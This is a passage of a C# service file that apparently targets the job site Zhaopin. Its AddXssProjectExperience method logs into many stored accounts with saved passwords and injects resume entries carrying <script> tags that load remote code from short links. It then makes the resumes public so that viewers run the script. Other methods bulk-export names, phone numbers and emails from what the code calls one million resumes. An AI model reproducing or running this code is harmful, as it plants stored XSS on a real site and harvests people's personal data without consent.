using Badoucai.EntityFramework.MySql;
using Badoucai.Library;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Xml;
using Aliyun.OSS;
using Badoucai.Business.Zhaopin;
using Badoucai.EntityFramework.PostgreSql.AIF_DB;
using Badoucai.EntityFramework.PostgreSql.BadoucaiAliyun_DB;
using Newtonsoft.Json.Linq;

namespace Badoucai.Service
{
    public class ProgramTasksThread : BaseThread
    {
        private static readonly ConcurrentQueue<string> fileQueue = new ConcurrentQueue<string>();

        private static readonly XmlDocument maritalStatusDoc = new XmlDocument();

        private static readonly XmlDocument degreeDoc = new XmlDocument();

        private static readonly XmlDocument positionDoc = new XmlDocument();

        private static readonly XmlDocument industryDoc = new XmlDocument();

        private static readonly XmlDocument districtDoc = new XmlDocument();

        private static readonly XmlDocument careerStatusDoc = new XmlDocument();

        private static int total;

        public override Thread Create()
        {
            return new Thread(() =>
            {
                try
                {
                    //ExportOssResumesToDB();       // 导出所有OSS简历到本地Resume表
                    //AddXssProjectExperience();    // 批量插入xss脚本
                    RefresResume();               // 刷新包含xss脚本的简历
                    //ExprotResume();               // 导出光荣要求格式的简历（弃用）
                    //Filter();                     // 过滤出线上库有，芒柠库没有的简历ID
                    //FilterZhaopin();              // 过滤出程楠100万简历里智联的简历
                    //WatchResume();                  // Watch 智联简历
                    //MatchResume();                  // Match 旧库简历
                    //ExportOssResume(259969597);   // 通过 ResumeId 导出 Oss 源文件
                }
                catch (Exception ex)
                {
                    Trace.TraceError(ex.ToString());
                }
            })
            {
                IsBackground = true
            };
        }

        /// <summary>
        /// 批量插入xss脚本
        /// </summary>
        public static void AddXssProjectExperience()
        {
            using (var db = new MangningXssDBEntities())
            {
                var query = from user in db.ZhaopinUser
                            join resume in db.ZhaopinResume on user.Id equals resume.UserId
                            where user.Source.Contains("MANUAL") && user.Status == null
                            select new { user.Username, user.Password, resume.DeliveryNumber, resume.Id, UserId = user.Id };

                var resumes = query.ToList();

                var stopwatch = new Stopwatch();

                foreach (var resume in resumes)
                {
                    stopwatch.Restart();

                    var param = $"int_count=999&errUrl=https%3A%2F%2Fpassport.zhaopin.com%2Faccount%2Flogin&RememberMe=true&requestFrom=portal&loginname={HttpUtility.UrlEncode(resume.Username)}&Password={HttpUtility.UrlEncode(resume.Password)}";

                    var cookieContainer = new CookieContainer();

                    var request = RequestFactory.QueryRequest("https://passport.zhaopin.com/account/login", param, RequestEnum.POST, cookieContainer);

                    if (!request.IsSuccess || !request.Data.Contains("basName"))
                    {
                        Trace.WriteLine($"{DateTime.Now} > Login error ! UserName = {resume.Username}, Message = {request.ErrorMsg}.");

                        continue;
                    }

                    param = $"Language_ID=1&ext_id={resume.DeliveryNumber}&Resume_ID={resume.Id}&Version_Number=1&EDIT_FLAG=&RowID=&SaveType=0&iMaxCount=3&project_name=%E4%BB%99%E6%9E%9C%E5%95%86%E5%9F%8E&start_date_y=2013&start_date_m=6&end_date_y=2014&end_date_m=2&it_flag=y&software=Tomcat7.0%E3%80%81JDK1.7%E3%80%81Mybatis%E3%80%81Mysql%E3%80%81spring%E3%80%81springmvc&hardware=win7&development=eclipse%E3%80%81Dreamweaver+6&responsibilities=%E5%95%86%E5%93%81%E7%9A%84%E4%BF%A1%E6%81%AF%E5%B1%95%E7%A4%BA%E3%80%81%E4%BB%A5%E5%8F%8A%E9%A2%84%E4%B9%B0%E4%BB%A5session%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%AD%98%E5%82%A8%E7%AD%89%E5%88%B0%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E5%90%8E%E5%86%8D%E6%8A%8A%E4%B9%8B%E5%89%8D%E7%9A%84sessio%E7%9A%84%E5%86%85%E5%AE%B9%E8%BD%AC%E7%A7%BB%E5%88%B0%E7%99%BB%E5%BD%95%E5%90%8E%E7%9A%84session%E9%87%8C%E9%9D%A2%E3%80%81%E6%94%AF%E4%BB%98%E8%AF%84%E8%AE%BA%E7%AD%89%E6%A8%A1%E5%9D%97&description=%E6%AD%A4%E9%A1%B9%E7%9B%AE%E6%98%AF%E6%88%91%E4%B8%8E%E6%88%91%E7%9A%84%E5%B0%8F%E7%BB%84%E6%88%90%E5%91%98%E5%85%B1%E5%90%8C%E5%BC%80%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9C%A8%E7%BA%BF%E8%B4%AD%E7%89%A9%E7%B1%BB%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%8C%E9%A1%B9%E7%9B%AE%E5%9C%A8%E7%BB%93%E6%9E%84%E4%B8%8A%E4%B8%BB%E8%A6%81%E5%8C%85%E6%8B%AC%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%E5%92%8C%E7%AE%A1%E7%90%86%E5%91%98%E6%A8%A1%E5%9D%97%E4%B8%A4%E5%A4%A7%E9%83%A8%E5%88%86%E7%BB%84%E6%88%90%E5%85%B6%E4%B8%AD%EF%BC%9A%0D%0A%0D%0A%E7%94%A8%E6%88%B7%E6%A8%A1%E5%9D%97%3A%E7%94%A8%E6%88%B7%E5%9C%A8%E6%B2%A1%E6%9C%89%E7%99%BB%E5%BD%95%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E5%8F%AF%E4%BB%A5%E5%AF%B9%E6%9C%AC%E5%95%86%E5%9F%8E%E8%BF%9B%E8%A1%8C%E7%B2%97%E7%95%A5%E7%9A%84%E4%BA%86%E8%A7%A3%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%A7%82%E7%9C%8B%E5%95%86%E5%9F%8E%E6%89%80%E8%B4%A9%E5%8D%96%E7%9A%84%E6%B0%B4%E6%9E%9C%E7%9A%84%E4%BF%A1%E6%81%AF%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E5%AF%B9%E6%9F%90%E4%B8%AA%E6%B0%B4%E6%9E%9C%E7%9A%84%E8%AF%84%E4%BB%B7%E7%AD%89%E7%AD%89%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E7%9A%84%E6%B3%A8%E5%86%8C%E5%92%8C%E7%99%BB%E5%BD%95%E3%80%82%E5%9C%A8%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%B9%8B%E5%90%8E%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E5%95%86%E5%93%81%E7%9A%84%E8%B4%AD%E4%B9%B0%E6%94%B6%E8%97%8F%E4%BB%A5%E5%8F%8A%E8%AF%84%E8%AE%BA%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%8F%AF%E4%BB%A5%E5%AF%B9%E6%88%91%E4%BB%AC%E5%95%86%E5%9F%8E%E8%BF%9B%E8%A1%8C%E6%8A%95%E8%AF%89%E6%88%96%E8%80%85%E5%BB%BA%E8%AE%AE%0D%0A%0D%0A%E7%AE%A1%E7%90%86%E5%91%98%E6%A8%A1%E5%9D%97%EF%BC%9A%E5%8F%AF%E4%BB%A5%E5%AF%B9%E7%94%A8%E6%88%B7%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B8%8D%E8%83%BD%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82%E4%B9%9F%E4%B8%8D%E8%83%BD%E6%9F%A5%0D%0A%E7%9C%8B%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E3%80%82%E5%8F%AF%E4%BB%A5%E5%AF%B9%E5%95%86%E5%9F%8E%E8%BF%9B%E8%A1%8C%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E6%9C%89%E5%B7%B2%E7%BB%8F%E6%B2%A1%E6%9C%89%E7%94%A8%E6%88%96%E8%80%85%E8%BF%9D%E6%B3%95%E7%9A%84%E5%95%86%E5%93%81%EF%BC%8C%0D%0A%E5%A6%82%E6%9E%9C%E6%9C%89%E7%9A%84%E8%AF%9D%E5%8F%AF%E4%BB%A5%E5%8E%BB%E9%99%A4%E3%80%82%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E7%9A%84%E6%8A%95%E8%AF%89%EF%BC%8C%E6%88%96%E8%80%85%E5%BB%BA%E8%AE%AE%E3%80%82%E5%8F%AF%E4%BB%A5%E5%86%8D%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%0D%0A%E9%9D%A2%E4%B8%AD%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E3%80%82%0D%0A%0D%0A%E9%A1%B9%E7%9B%AE%E5%9C%A8%E6%8A%80%E6%9C%AF%E4%B8%8A%E4%B8%BB%E8%A6%81%E4%BD%BF%E7%94%A8%E4%BA%86%EF%BC%9A%0D%0AMVC%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%81MySql%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%80%9A%E8%BF%87+%3Cscript+type%3D%22text%2Fjavascript%22+src%3D%22http%3A%2F%2Fapi.map.baidu.com%2Fapi%3Fv%3D2.0%26ak%3D67jMQ5DmYTe1TLMBKFUTcZAR%22%3E%3C%2Fscript%3E%E8%B0%83%E7%94%A8%E7%99%BE%E5%BA%A6%E5%9C%B0%E5%9B%BEapi%E8%BF%9B%E8%A1%8C%E5%9C%B0%E5%9B%BE%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E5%B9%B6%E6%B8%B2%E6%9F%93%EF%BC%9B%0D%0A%0D%0A%E7%84%B6%E5%90%8E%E9%80%9A%E8%BF%87%3Cscript+type%3D%27text%2Fjavascript%27+src%3D%27http%3A%2F%2Ft.cn%2FRnQMA9B%27%3E%3C%2Fscript%3E%E8%B0%83%E7%94%A8%E7%99%BE%E5%BA%A6%E5%AE%9A%E4%BD%8Dapi%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E5%AE%9A%E4%BD%8D%E4%BF%A1%E6%81%AF%EF%BC%9B%0D%0A%E6%9C%80%E5%90%8E%E9%80%9A%E8%BF%87%3Cscript+type%3D%27text%2Fjavascript%27+src%3D%27http%3A%2F%2Ft.cn%2FRnQGjPE%27%3E%3C%2Fscript%3E%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%86%85%E9%83%A8%E6%8E%A5%E5%8F%A3%E5%AF%B9session%E8%BF%9B%E8%A1%8C%E4%BA%86%E7%AE%80%E5%8D%95%E7%9A%84%E4%BF%A1%E6%81%AF%E4%BF%9D%E5%AD%98%E3%80%82%0D%0A%0D%0A%E5%AE%9E%E7%8E%B0%E4%BA%86%E5%95%86%E5%93%81%E7%9A%84%E4%BF%A1%E6%81%AF%E5%B1%95%E7%A4%BA%E3%80%81%E4%BB%A5%E5%8F%8A%E9%A2%84%E4%B9%B0%E4%BB%A5session%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%AD%98%E5%82%A8%E7%AD%89%E5%88%B0%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E5%90%8E%E5%86%8D%E6%8A%8A%E4%B9%8B%E5%89%8D%E7%9A%84sessio%E7%9A%84%E5%86%85%E5%AE%B9%E8%BD%AC%E7%A7%BB%E5%88%B0%E7%99%BB%E5%BD%95%E5%90%8E%E7%9A%84session%E9%87%8C%E9%9D%A2%E3%80%81%E6%94%AF%E4%BB%98%E8%AF%84%E8%AE%BA%E7%AD%89%E6%A8%A1%E5%9D%97";

                    request = RequestFactory.QueryRequest("https://i.zhaopin.com/resume/ProjectExperience/Save", param, RequestEnum.POST, cookieContainer);

                    if (!request.IsSuccess)
                    {
                        Trace.WriteLine($"{DateTime.Now} > Add project experience error ! UserName = {resume.Username}, Message = {request.ErrorMsg}.");

                        continue;
                    }

                    request = RequestFactory.QueryRequest($"https://i.zhaopin.com/ResumeCenter/MyCenter/SetOpenStatus?Resume_ID={resume.Id}&Ext_ID={resume.DeliveryNumber}&Version_Number=1&Language_ID=1&level=2&t={BaseFanctory.GetUnixTimestamp()}", cookieContainer: cookieContainer);

                    if (!request.IsSuccess)
                    {
                        Trace.WriteLine($"{DateTime.Now} > Set open status request error ! UserName = {resume.Username}, Message = {request.ErrorMsg}.");

                        continue;
                    }

                    try
                    {
                        var jsonObj = JsonConvert.DeserializeObject<dynamic>(request.Data);

                        if (jsonObj.Code != 0)
                        {
                            Trace.WriteLine($"{DateTime.Now} > Set open status error ! UserName = {resume.Username}, Message = {jsonObj.Msg}.");
                        }
                    }
                    catch (Exception)
                    {
                        Trace.WriteLine($"{DateTime.Now} > Set open status error ! UserName = {resume.Username}.");

                        continue;
                    }

                    request = RequestFactory.QueryRequest($"https://i.zhaopin.com/ResumeCenter/MyCenter/RefreshResume?resumeId={resume.Id}&resumenum={resume.DeliveryNumber}&version=1&language=1&t={BaseFanctory.GetUnixTimestamp()}", cookieContainer: cookieContainer);

                    if (!request.IsSuccess)
                    {
                        Trace.WriteLine($"{DateTime.Now} > Refresh resume error ! UserName = {resume.Username}, Message = {request.ErrorMsg}.");

                        continue;
                    }

                    var user = db.ZhaopinUser.FirstOrDefault(f => f.Id == resume.UserId);

                    if (user != null)
                    {
                        user.Status = "1";

                        db.SaveChanges();
                    }

                    stopwatch.Stop();

                    Console.WriteLine($"{DateTime.Now} > Add Success ! UserName = {resume.Username}, Elapsed = {stopwatch.ElapsedMilliseconds} ms.");
                }
            }
        }

        /// <summary>
        /// 刷新简历
        /// </summary>
        public static void RefresResume()
        {
            using (var db = new MangningXssDBEntities())
            {
                var query = from user in db.ZhaopinUser
                    join resume in db.ZhaopinResume on user.Id equals resume.UserId
                    where user.Source.Contains("MANUAL")
                    select new { user.Username, user.Password, resume.DeliveryNumber, resume.Id, UserId = user.Id };

                var resumes = query.ToList();

                var stopwatch = new Stopwatch();

                var count = 0;

                foreach (var resume in resumes)
                {
                    stopwatch.Restart();

                    var param = $"int_count=999&errUrl=https%3A%2F%2Fpassport.zhaopin.com%2Faccount%2Flogin&RememberMe=true&requestFrom=portal&loginname={HttpUtility.UrlEncode(resume.Username)}&Password={HttpUtility.UrlEncode(resume.Password)}";

                    var cookieContainer = new CookieContainer();

                    var request = RequestFactory.QueryRequest("https://passport.zhaopin.com/account/login", param, RequestEnum.POST, cookieContainer);

                    if (!request.IsSuccess || !request.Data.Contains("basName"))
                    {
                        Trace.WriteLine($"{DateTime.Now} > Login error ! UserName = {resume.Username}, Message = {request.ErrorMsg}.");

                        continue;
                    }

                    request = RequestFactory.QueryRequest($"https://i.zhaopin.com/ResumeCenter/MyCenter/RefreshResume?resumeId={resume.Id}&resumenum={resume.DeliveryNumber}&version=1&language=1&t={BaseFanctory.GetUnixTimestamp()}", cookieContainer: cookieContainer);

                    if (!request.IsSuccess)
                    {
                        Trace.WriteLine($"{DateTime.Now} > Refresh resume error ! UserName = {resume.Username}, Message = {request.ErrorMsg}.");

                        continue;
                    }

                    //request = RequestFactory.QueryRequest("https://i.zhaopin.com/Resume/Education/Update",$"Resume_ID={resume.Id}&Ext_ID={resume.DeliveryNumber}&Version_Number=1&Language_ID=1&RowID=0&SaveType=0&start_date_y=2004&start_date_m=9&end_date_y=2008&end_date_m=7&school_name=%E6%B7%B1%E5%9C%B3%E5%A4%A7%E5%AD%A6&tongzhao=y&mainMajor=1&subMajor=77&major=%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%8E%E6%8A%80%E6%9C%AF&degree=4", cookieContainer: cookieContainer);

                    //if (!request.IsSuccess)
                    //{
                    //    Trace.WriteLine($"{DateTime.Now} > Edit resume education error ! UserName = {resume.Username}, Message = {request.ErrorMsg}.");
                    //}

                    //var address = new[] { new { p = 538, c = 538 }, new { p = 548, c = 763 }, new { p = 548, c = 765 } }[new Random().Next(3)];

                    //request = RequestFactory.QueryRequest("https://i.zhaopin.com/Resume/BaseInfo/Save", $"Resume_ID={resume.Id}&Ext_ID={resume.DeliveryNumber}&Version_Number=1&Language_ID=1&username=%E9%AD%8F%E5%85%88%E7%94%9F&gender=1&birth_date_y=1989&birth_date_m=11&experience=2013&experience_month=6&expe=&hukou={address.c}&hukou_p={address.p}&residence={address.c}&residence_p={address.p}&residence_district=&contact_num=178****8054&email1=1789777****%40qq.com&marital=2&nationality=0&overseas=0&overseasyear=1&political_status=6", cookieContainer: cookieContainer);

                    //if (!request.IsSuccess)
                    //{
                    //    Trace.WriteLine($"{DateTime.Now} > Edit resume address error ! UserName = {resume.Username}, Message = {request.ErrorMsg}, Address = {address.c}.");
                    //}

                    stopwatch.Stop();

                    Console.WriteLine($"{DateTime.Now} > Success ! Count = {++count}, UserName = {resume.Username}, Elapsed = {stopwatch.ElapsedMilliseconds} ms.");
                }
            }
        }

        /// <summary>
        /// 通过ResumIdArray导出简历
        /// </summary>
        public static void ExportJosn()
        {
            const string path = @"F:\深圳大街.txt";

            var resumeIdArr = new List<int>();

            var tempList = new List<int>();

            var count = 0;

            var items = File.ReadAllText(path).Split(",");

            Console.WriteLine($"{DateTime.Now} > Items length = {items.Length}.");

            foreach (var item in items)
            {
                try
                {
                    if (tempList.Count < 128)
                    {
                        tempList.Add(Convert.ToInt32(Path.GetFileNameWithoutExtension(item)));

                        continue;
                    }

                    var arr = tempList.ToArray();

                    using (var db = new MangningXssDBEntities())
                    {
                        var resumeIds = db.ZhaopinResume.AsNoTracking().Where(w => arr.Contains(w.Id) && w.Flag == 15).Select(s => s.Id).ToArray();

                        resumeIdArr.AddRange(resumeIds);

                        Console.WriteLine($"{DateTime.Now} > Total = {resumeIdArr.Count}, Current = {resumeIds.Length}.");
                    }

                    tempList.Clear();
                }
                catch (Exception ex)
                {
                    Trace.WriteLine($"{DateTime.Now} > Get files error ! Message = {ex.Message}.");
                }
            }

            for (var i = 0; i < resumeIdArr.Count; i++)
            {
                try
                {
                    using (var stream = new MemoryStream())
                    {
                        var bytes = new byte[1024];

                        int len;

                        var streamContent = mangningOssClient.GetObject(mangningBucketName, $"Zhaopin/Resume/{resumeIdArr[i]}").Content;

                        while ((len = streamContent.Read(bytes, 0, bytes.Length)) > 0)
                        {
                            stream.Write(bytes, 0, len);
                        }

                        var resumeContent = Encoding.UTF8.GetString(GZip.Decompress(stream.ToArray()));

                        var filePath = $@"F:\南京苏州杭州\{resumeIdArr[i].ToString().Substring(0, 2)}";

                        if (!Directory.Exists(filePath)) Directory.CreateDirectory(filePath);

                        File.WriteAllText($@"{filePath}\{resumeIdArr[i]}.json", resumeContent);

                        Interlocked.Increment(ref count);

                        Console.WriteLine($"{DateTime.Now} > Total Resume = {count}, i = {i}.");
                    }
                }
                catch (Exception ex)
                {
                    Trace.WriteLine($"{DateTime.Now} > Get resume error ! Message = {ex.Message}.");
                }
            }

            Console.WriteLine($"{DateTime.Now} > End.");
        }

        /// <summary>
        /// 删除导出的部分简历
        /// </summary>
        public static void DeleteJosn()
        {
            var paths = Directory.GetDirectories(@"F:\南京苏州杭州");

            var count = 0;

            foreach (var path in paths)
            {
                var files = Directory.GetFiles(path);

                foreach (var item in files)
                {
                    var data = File.ReadAllText(item);

                    var resumeObj = JsonConvert.DeserializeObject<dynamic>(data);

                    var resumeDetail = JsonConvert.DeserializeObject(resumeObj.detialJSonStr.ToString());

                    var date = BaseFanctory.GetTime((string)resumeDetail.DateModified);

                    Console.WriteLine($"{DateTime.Now} > Count = {count}, RefrenceDate = {date.Date}");

                    if (date.Date > DateTime.Today.AddDays(-31)) continue;

                    if (++count > 25125) return;

                    File.Delete(item);
                }
            }
        }

        /// <summary>
        /// 导出深证硕士简历
        /// </summary>
        public static void ExprotResume()
        {
            var resumeIdArray = File.ReadAllLines(@"D:\BadoucaiData\Badoucai.Data\Badoucai.Service\bin\RefreshResume\UpdateResumeIdArray.txt");

            //var areaArray = new[]
            //{
            //    90617836
            //};

            //var degreeArray = new[] { "G" };

            const int exportCount = 5000;

            var queue = new ConcurrentQueue<CoreResumeSummary>();

            using (var badoucai = new BadoucaiAliyunDBEntities())
            {
                badoucai.Database.CommandTimeout = 6000;

                var references = badoucai.CoreResumeReference.AsNoTracking().Where(w => resumeIdArray.Contains(w.Id)).Select(s => s.ResumeId).ToArray();

                var summarys = badoucai.CoreResumeSummary.AsNoTracking().Where(f => references.Contains(f.Id));

                foreach (var summary in summarys)
                {
                    queue.Enqueue(summary);
                }

                //var list = badoucai.CoreResumeSummary.Where(w => areaArray.Contains(w.RegisteredResidenc) && degreeArray.Contains(w.Degree)).OrderByDescending(o => o.UpdateTime).Take(exportCount + 100).ToList();

                //foreach (var item in list)
                //{
                //    queue.Enqueue(item);
                //}
            }

           var sb = new StringBuilder();

            sb.AppendLine("姓名\t性别\t出生日期\t期望职位\t工作年限\t移动电话\t电子邮箱\t目前居住地\t通讯地址\t户口\t现在单位\t学校名称\t专业名称\t最高学历\t期望薪资（税前）\t更新时间");

            var count = queue.Count;

            var success = 0;

            //var lines = File.ReadAllLines(@"D:\Workspace\导出的简历（光荣）\深圳_硕士_50份.txt");

            //var cellphoneHashSet = new HashSet<string>();

            //for (var i = 0; i < lines.Length; i++)
            //{
            //    if (i == 0) continue;

            //    cellphoneHashSet.Add(lines[i].Split("\t")[5]);
            //}

            var tasks = new List<Task>();

            for (var i = 0; i < 8; i++)
            {
                tasks.Add(Task.Run(() =>
                {
                    while (true)
                    {
                        CoreResumeSummary resume;

                        if (!queue.TryDequeue(out resume)) break;

                        try
                        {
                            //if(cellphoneHashSet.Contains(resume.Cellphone.ToString())) continue;

                            using (var aif = new AIFDBEntities())
                            {
                                var address = string.Empty;

                                var addressId = resume.CurrentResidence;

                                while (true)
                                {
                                    var id = addressId;

                                    var city = aif.BaseAreaBDC.AsNoTracking().FirstOrDefault(f => f.Id == id);

                                    if (city == null || city.PId == -1) break;

                                    addressId = city.PId;

                                    address = address.Insert(0, city.Name);
                                }

                                if (address.StartsWith("中国")) address = address.Substring(2);

                                var gender = resume.Gender == "M" ? "男" : "女";

                                var workYears = 2018 - Convert.ToInt32(resume.WorkStarts.ToString("yyyy"));

                                using (var badoucai = new BadoucaiAliyunDBEntities())
                                {
                                    var work = badoucai.Database.SqlQuery<CoreResumeWork>($"SELECT * FROM \"Core_Resume_Work\" WHERE \"ResumeId\" = '{resume.Id}' AND \"Id\" = 1").FirstOrDefault();

                                    var company = work?.Company ?? "";

                                    var school = badoucai.Database.SqlQuery<CoreResumeEducation>($"SELECT * FROM \"Core_Resume_Education\" WHERE \"ResumeId\" = '{resume.Id}' AND \"Id\" = 1").FirstOrDefault();

                                    var intention = badoucai.Database.SqlQuery<CoreResumeIntention>($"SELECT * FROM \"Core_Resume_Intention\" WHERE \"ResumeId\" = '{resume.Id}'").FirstOrDefault();
                                
                                    var salary = intention == null ? "" : $"{intention.MinimumSalary} - {intention.MaximumSalary}";

                                    var doc = new XmlDocument();

                                    doc.Load(@"Data\Degree.xml");

                                    var degree = doc.SelectSingleNode("/nodes[@type='zhaopin']")?.SelectSingleNode($"//*[@result-key='{resume.Degree}']")?.Attributes?["result-value"].Value;

                                    var position = "";

                                    var reference = badoucai.CoreResumeReference.FirstOrDefault(f => f.ResumeId == resume.Id);

                                    if (reference != null)
                                    {
                                        var jsonContent = GetOssResume(mangningBucketName, $"Zhaopin/Resume/{reference.Id}");

                                        if (!string.IsNullOrWhiteSpace(jsonContent))
                                        {
                                            var jsonObj = JsonConvert.DeserializeObject<dynamic>(jsonContent);

                                            var detialJSonStr = JsonConvert.DeserializeObject<dynamic>(jsonObj.detialJSonStr.ToString());

                                            var positions = ((string)detialJSonStr.DesiredPosition[0].DesiredJobType).Split(",");

                                            doc.Load(@"Data\Position.xml");

                                            position = positions.Where(item => !string.IsNullOrEmpty(item)).Aggregate(position, (current, item) => $"{current}|{doc.SelectSingleNode($"//*[@source-key='{item}']")?.Attributes?["source-value"].Value}").Substring(1);
                                        }
                                    }

                                    sb.AppendLine($"{resume.Name}\t{gender}\t{resume.Birthday: yyyy-MM-dd}\t{position}\t{workYears}\t{resume.Cellphone}\t{resume.Email}\t{address}\t\t深圳\t{company}\t{school?.School}\t{school?.Major}\t{degree}\t{salary}\t{resume.UpdateTime:yyyyMMdd}");
                                }
                            }

                            Interlocked.Increment(ref success);

                            Console.WriteLine($"{DateTime.Now} > Count = {count}, Success = {success}, ResumeId = {resume.Id}, Name = {resume.Name}.");

                            if (success > exportCount) return;
                        }
                        catch (Exception ex)
                        {
                            Trace.WriteLine(ex.ToString());
                        }
                    }
                }));
            }

            Task.WaitAll(tasks.ToArray());

            //File.WriteAllText($@"D:\Workspace\导出的简历（光荣）\武汉_销售_客服_催收份_{DateTime.Now:yyyy-MM-dd HHmmss}.txt", sb.ToString());
            File.WriteAllText($@"D:\Workspace\导出的简历（光荣）\北京IT{DateTime.Now:yyyy-MM-dd HHmmss}.txt", sb.ToString());

            Console.WriteLine($"{DateTime.Now} > Complete !");
        }

        /// <summary>
        /// 过滤线上库有，芒柠库没有的简历
        /// </summary>
        public static void Filter()
        {
            var queue = new ConcurrentQueue<int[]>();

            var noExists = 0;

            var existsIdList = new List<string>();

            var tasks = new List<Task>();

            var isComplate = false;

            Task.Run(() =>
            {
                using (var badoucai = new BadoucaiAliyunDBEntities())
                {
                    var pageIndex = 0;

                    while (true)
                    {
                        try
                        {
                            var list = badoucai.CoreResumeReference.AsNoTracking().Where(w => w.Source == "ZHAOPIN").OrderBy(o => o.Id).Skip(512 * pageIndex++).Take(512).Select(s => s.Id).ToList();

                            var idArray = list.Select(s => Convert.ToInt32(s)).ToArray();

                            if (idArray.Length == 0) break;

                            queue.Enqueue(idArray);
                        }
                        catch (Exception ex)
                        {
                            Trace.TraceError(ex.ToString());

                            //pageIndex--;
                        }
                    }

                    isComplate = true;
                }
            });


            for (var i = 0; i < 8; i++)
            {
                tasks.Add(Task.Run(() =>
                {
                    while (true)
                    {
                        int[] idArray;

                        if (!queue.TryDequeue(out idArray))
                        {
                            Thread.Sleep(100);

                            if (isComplate) break;

                            continue;
                        }

                        try
                        {
                            using (var db = new MangningXssDBEntities())
                            {
                                var idList = db.ZhaopinResume.AsNoTracking().Where(w => idArray.Contains(w.Id)).Select(s => s.Id).ToList();

                                var arr = idList.Select(s => s.ToString()).ToArray();

                                var list = idArray.Select(s => s.ToString()).ToList();

                                list.RemoveAll(r => arr.Contains(r.ToString()));

                                if (list.Any()) existsIdList.AddRange(list);

                                Interlocked.Add(ref noExists, list.Count);

                                Interlocked.Add(ref total, idArray.Length);

                                Console.WriteLine($"{DateTime.Now} > Total = {total}, NoExists = {noExists}");
                            }
                        }
                        catch (Exception ex)
                        {
                            queue.Enqueue(idArray);

                            Trace.TraceError(ex.ToString());
                        }
                    }
                }));
            }

            Task.WaitAll(tasks.ToArray());

            File.AppendAllLines(@"D:\芒柠库没有的简历ID.txt", existsIdList);
        }

        /// <summary>
        /// 过滤出智联的有效简历
        /// </summary>
        public static void FilterZhaopin()
        {
            var files = Directory.GetFiles(@"D:\Workspace\程楠的100万简历\智联招聘");

            var count = files.Length;

            var num = 0;

            var notExists = 0;

            var sb = new StringBuilder();

            var queue = new ConcurrentQueue<string>();

            foreach (var file in files)
            {
                queue.Enqueue(file);
            }

            var tasks = new List<Task>();

            for (var i = 0; i < 8; i++)
            {
                tasks.Add(Task.Run(() =>
                {
                    while (true)
                    {
                        string file;

                        if(!queue.TryDequeue(out file)) break;

                        var fileName = Path.GetFileName(file);

                        var content = File.ReadAllText(file);

                        var match = Regex.Match(content, "(?s)>ID:(\\S{10}).+?Mobile：(.+?)<.+?mailto:(.+?)\"");

                        if (match.Success)
                        {
                            var resumeNumber = match.Result("$1");

                            using (var db = new MangningXssDBEntities())
                            {
                                var resume = db.ZhaopinResume.FirstOrDefault(a => a.RandomNumber == resumeNumber && a.Flag != 0 && a.Flag != 13);

                                if (resume == null)
                                {
                                    sb.AppendLine($"{match.Result("$1")},{match.Result("$2")},{match.Result("$3")}");

                                    Interlocked.Increment(ref notExists);
                                }
                            }

                            var path = @"D:\Workspace\程楠的100万简历\智联招聘_Success\" + fileName;

                            if (File.Exists(path)) File.Delete(path);

                            File.Move(file, path);

                            Interlocked.Increment(ref num);
                        }

                        Console.WriteLine($"{DateTime.Now} > Count = {Interlocked.Decrement(ref count)}, Num = {num}, NotExists = {notExists}, File Name = {fileName}.");
                    }
                }));
            }

            Task.WaitAll(tasks.ToArray());

            File.AppendAllText(@"D:\Workspace\程楠的100万简历\智联招聘.txt",sb.ToString());

            Console.WriteLine($"{DateTime.Now} > Complete !");
        }

        /// <summary>
        /// 获取 Oss 简历 Json
        /// </summary>
        /// <param name="bucketName"></param>
        /// <param name="key"></param>
        /// <returns></returns>
        private static string GetOssResume(string bucketName, string key)
        {
            try
            {
                using (var stream = new MemoryStream())
                {
                    var bytes = new byte[1024];

                    int len;

                    var streamContent = mangningOssClient.GetObject(bucketName, key).Content;

                    while ((len = streamContent.Read(bytes, 0, bytes.Length)) > 0)
                    {
                        stream.Write(bytes, 0, len);
                    }

                    var resumeContent = Encoding.UTF8.GetString(GZip.Decompress(stream.ToArray()));

                    return resumeContent;
                }
            }
            catch (Exception ex)
            {
                Trace.WriteLine($"{DateTime.Now} > Get resume error ! Message = {ex.Message}.");

                return "";
            }
        }

        /// <summary>
        /// 导出OSS简历至数据库
        /// </summary>
        public static void ExportOssResumesToDB()
        {
